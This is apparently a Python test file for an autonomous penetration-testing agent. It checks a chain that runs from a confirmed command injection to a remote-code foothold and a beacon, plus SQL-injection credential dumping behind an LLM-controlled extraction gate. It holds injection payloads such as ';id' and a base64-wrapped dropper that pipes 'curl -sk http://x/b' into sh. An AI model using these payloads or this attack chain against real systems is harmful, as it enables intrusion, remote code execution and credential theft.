"""FASE B tests: the confirmed-cmdi -> RCE foothold -> beacon chain, and
the LLM data-extraction gate on web credential dumping."""
import unittest
from unittest.mock import patch

from phantom.automation.belief import WorldModel


class TestCmdiRceChain(unittest.TestCase):
    def _wm_with_cmdi(self, endpoint="/?cmd=1;id", port="80"):
        wm = WorldModel(target="10.0.0.9")
        wm.add_finding("hunt_anomaly", "cmdi:80:probe",
                       {"cls": "cmdi", "confirmed": True,
                        "endpoint": endpoint, "port": port,
                        "score": "0.9"}, source="hunt_web")
        return wm

    def test_candidate_picks_confirmed_cmdi(self):
        from phantom.automation.guidance.kit import _pick_rce_candidate
        wm = self._wm_with_cmdi()
        cand = _pick_rce_candidate(wm)
        self.assertIsNotNone(cand)
        self.assertEqual(cand["channel"], "cmdi")
        self.assertEqual(cand["endpoint"], "/?cmd=1;id")

    def test_unconfirmed_cmdi_is_not_a_candidate(self):
        from phantom.automation.guidance.kit import _pick_rce_candidate
        wm = WorldModel(target="10.0.0.9")
        wm.add_finding("hunt_anomaly", "cmdi:80:probe",
                       {"cls": "cmdi", "confirmed": False,
                        "endpoint": "/?cmd=1;id", "port": "80",
                        "score": "0.6"}, source="hunt_web")
        self.assertIsNone(_pick_rce_candidate(wm))

    def test_inject_endpoint_preserves_separator(self):
        from phantom.automation.guidance.kit import _cmdi_inject_endpoint
        self.assertEqual(
            _cmdi_inject_endpoint("/?cmd=1;id", "echo X"),
            "/?cmd=1%3Becho%20X")
        self.assertEqual(
            _cmdi_inject_endpoint("/search?q=1|id&x=2", "echo X"),
            "/search?q=1%7Cecho%20X&x=2")
        self.assertIsNone(_cmdi_inject_endpoint("/static", "echo X"))

    def test_rce_foothold_adapter_cmdi_channel(self):
        from phantom.automation.guidance.kit import _rce_foothold_adapter
        wm = self._wm_with_cmdi()
        cmd = _rce_foothold_adapter(wm, {})
        self.assertIn("curl -m 10 -s", cmd)
        self.assertIn("RCE:channel=cmdi", cmd)
        # the injected command carries a random marker
        self.assertIn("PHANTOM_RCE_", cmd)

    def test_beacon_via_cmdi_injects_dropper(self):
        import urllib.parse
        from phantom.automation.guidance.kit import _beacon_via_rce_adapter
        wm = self._wm_with_cmdi()
        cmd = _beacon_via_rce_adapter(wm, {"command": "curl -sk http://x/b"})
        self.assertIn("PHANTOM_RCE_DELIVERED", cmd)
        # the injected command is URL-encoded inside the param value; the
        # server decodes it, so decode the endpoint to see the real payload
        decoded = urllib.parse.unquote(cmd)
        self.assertIn("base64 -d | sh", decoded)
        # the dropper command itself is base64-encoded inside the injection
        # (so it survives quote/space escaping) — decode the b64 blob and
        # confirm it IS the beacon command
        import base64
        m = __import__("re").search(r"echo ([A-Za-z0-9+/=]+) \| base64", decoded)
        self.assertIsNotNone(m, decoded)
        self.assertEqual(
            base64.b64decode(m.group(1)).decode(), "curl -sk http://x/b")


class TestSqliLlmGate(unittest.TestCase):
    def test_extract_data_flag_propagates_to_bypass(self):
        import phantom.automation.exploit.webcreds as wc
        md5 = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5("password")
        table = (f"<table><tr><td>admin</td><td>{md5}</td></tr></table>")
        wm = WorldModel(target="10.0.0.9")
        wm.add_finding("service", "tcp/8080",
                       {"port": 8080, "service": "http"}, source="s")
        with patch.object(wc, "_http_get", return_value="<html></html>"), \
                patch.object(wc, "_http_post") as post, \
                patch.object(wc, "_sql_baseline",
                             return_value={"forms": ["http://10.0.0.9:8080/login"]}):
            post.return_value = table
            # extraction ON: auth bypass + hash rows expected
            full = wc.run_web_creds_dump(wm, "10.0.0.9")
            methods = {c.method for c in full}
            self.assertTrue(methods & {"sqli-auth", "sqli-table", "sqli-hash"},
                            methods)
            # extraction OFF (LLM gate): only the proof row comes back
            proof = wc.run_web_creds_dump(wm, "10.0.0.9", extract_data=False)
            self.assertEqual({c.method for c in proof}, {"sqli-proof"})

    def test_agent_passes_extract_data_by_llm_state(self):
        import inspect
        from phantom.automation import agent as agent_mod
        src = inspect.getsource(agent_mod.AutonomousAgent)
        self.assertIn("extract_data=not llm_on", src)
        self.assertIn('self.llm_advisor.enabled', src)


if __name__ == "__main__":
    unittest.main()